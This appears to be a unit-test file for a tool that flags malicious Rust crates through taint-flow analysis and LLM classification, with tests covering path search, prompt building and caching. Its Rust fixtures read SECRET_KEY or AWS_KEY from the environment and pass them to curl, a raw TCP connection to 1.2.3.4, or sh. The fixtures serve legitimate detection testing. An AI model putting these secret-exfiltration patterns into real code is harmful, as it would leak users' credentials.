"""Unit tests for taintflow analysis, call graph, path search, and prompt generation."""

import pytest
from crateshield.taintflow import (
    RustASTParser, CrateCallGraph, TaintEngine, extract_taint_context,
)
from harness.hybrid_taint import build_hybrid_taint_prompt


def test_ast_source_sink_detection():
    parser = RustASTParser()
    code = """
    use std::env;
    use std::process::Command;

    fn exfil() {
        let key = env::var("SECRET_KEY").unwrap();
        Command::new("curl").arg(key).spawn().unwrap();
    }
    """
    info = parser.parse_file("src/lib.rs", code)
    assert len(info.functions) == 1
    fn = info.functions[0]
    assert fn.name == "exfil"
    assert len(fn.direct_sources) > 0
    assert any("env::var" in s.pattern for s in fn.direct_sources)
    assert len(fn.direct_sinks) > 0
    assert any("Command" in s.pattern for s in fn.direct_sinks)


def test_inter_procedural_forward_path():
    parser = RustASTParser()
    code1 = """
    use std::env;
    fn read_secret() -> String {
        env::var("AWS_KEY").unwrap_or_default()
    }
    """
    code2 = """
    use std::net::TcpStream;
    fn send_out(data: String) {
        let _ = TcpStream::connect("1.2.3.4:8080");
    }
    """
    code_main = """
    fn run() {
        let s = read_secret();
        send_out(s);
    }
    """
    cg = CrateCallGraph()
    cg.add_file(parser.parse_file("src/secret.rs", code1))
    cg.add_file(parser.parse_file("src/net.rs", code2))
    cg.add_file(parser.parse_file("src/main.rs", code_main))
    cg.build_edges()

    engine = TaintEngine(max_depth=4)
    paths = engine.find_taint_paths(cg)
    assert len(paths) >= 1
    # Check that coordinator path [read_secret, run, send_out] was found
    coord_paths = [p for p in paths if p.path_type == "coordinator"]
    assert len(coord_paths) >= 1
    p = coord_paths[0]
    names = [n.name for n in p.nodes]
    assert "read_secret" in names
    assert "run" in names
    assert "send_out" in names


def test_fallback_mode_when_disconnected():
    view = {
        "name": "isolated_crate",
        "version": "0.1.0",
        "source_files": {
            "src/lib.rs": "fn do_math(a: i32, b: i32) -> i32 { a + b }",
            "build.rs": 'fn main() { println!("cargo:rerun-if-changed=build.rs"); }',
        },
        "build_rs": 'fn main() { println!("cargo:rerun-if-changed=build.rs"); }',
        "build_script_path": "build.rs",
    }
    res = extract_taint_context(view)
    assert res["fallback_used"] is True
    assert "NOTE: No connected source-sink path found" in res["formatted_text"]
    assert "build.rs" in res["formatted_text"]


def test_context_budget_capping():
    huge_body = "\n".join(f'    let x_{i} = "{i}" * 100;' for i in range(1000))
    huge_code = f"fn big_fn() {{\n{huge_body}\n}}"
    view = {
        "name": "huge_crate",
        "version": "0.1.0",
        "source_files": {
            "build.rs": f'fn main() {{\n    std::env::var("FOO");\n    std::process::Command::new("sh");\n}}\n{huge_code}',
        },
        "build_rs": f'fn main() {{\n    std::env::var("FOO");\n    std::process::Command::new("sh");\n}}\n{huge_code}',
    }
    res = extract_taint_context(view, max_total_chars=10000)
    assert res["total_chars"] <= 10000


def test_prompt_construction():
    signals = {"source_scan": {"env_var_access": True}}
    taint_context = {
        "formatted_text": "=== Taint Flow Path 1 ===\nfn steal() {}",
        "paths_found": 1,
        "path_lengths": [1],
        "fallback_used": False,
        "total_chars": 50,
        "omitted_regions": [],
    }
    messages = build_hybrid_taint_prompt(signals, taint_context)
    assert len(messages) >= 2
    user_msg = messages[-1]["content"]
    assert "<untrusted_crate_data>" in user_msg
    assert "</untrusted_crate_data>" in user_msg
    assert "=== Taint Flow Path 1 ===" in user_msg


def test_hybrid_taint_dry_run_cache_bypass(monkeypatch):
    """Verify that a stale dry_run=True cache entry for hybrid_taint is bypassed on a live call."""
    import json
    from scripts.v3.run_eval import evaluate_sample_v3

    cache = {}
    sample_meta = {
        "sample_id": "s3_0035_malicious",
        "pair_id": "pair_01",
        "cluster_id": "sha2",
        "split": "eval",
        "twin_type": "malicious",
        "label": "MALICIOUS",
        "family": "F1",
        "seen_or_heldout": "SEEN",
        "ladder_level": "L1",
    }

    # 1. Execute dry run for hybrid_taint
    dry_res = evaluate_sample_v3(sample_meta, "hybrid_taint", "gemini-3.5-flash-lite", cache, repeat=0, dry_run=True)
    assert dry_res["dry_run"] is True
    assert dry_res["finish_reason"] == "dry_run"

    # Ensure dry_run entry exists in cache
    assert len(cache) == 1
    cache_key = next(iter(cache.keys()))
    assert cache[cache_key]["dry_run"] is True

    # 2. Mock call_model_api to track live invocation
    call_count = 0
    def mock_call_model_api(*args, **kwargs):
        nonlocal call_count
        call_count += 1
        return json.dumps({
            "classification": "MALICIOUS",
            "confidence": "HIGH",
            "malware_score": 0.95,
            "reasoning": "verified live call"
        }), 100, 50, 0.001, "STOP"

    monkeypatch.setattr("scripts.v3.run_eval.call_model_api", mock_call_model_api)

    # 3. Execute live run (dry_run=False) with the dry-run polluted cache
    live_res = evaluate_sample_v3(sample_meta, "hybrid_taint", "gemini-3.5-flash-lite", cache, repeat=0, dry_run=False)
    assert call_count == 1, "Live call must NOT treat stale dry_run entry as a cache hit!"
    assert live_res["dry_run"] is False
    assert live_res["classification"]["classification"] == "MALICIOUS"
    assert live_res["finish_reason"] == "STOP"

    # 4. Execute second live run: must hit the live cache entry without another API call
    second_live_res = evaluate_sample_v3(sample_meta, "hybrid_taint", "gemini-3.5-flash-lite", cache, repeat=0, dry_run=False)
    assert call_count == 1, "Second live call must hit live cache!"
    assert second_live_res["classification"]["classification"] == "MALICIOUS"

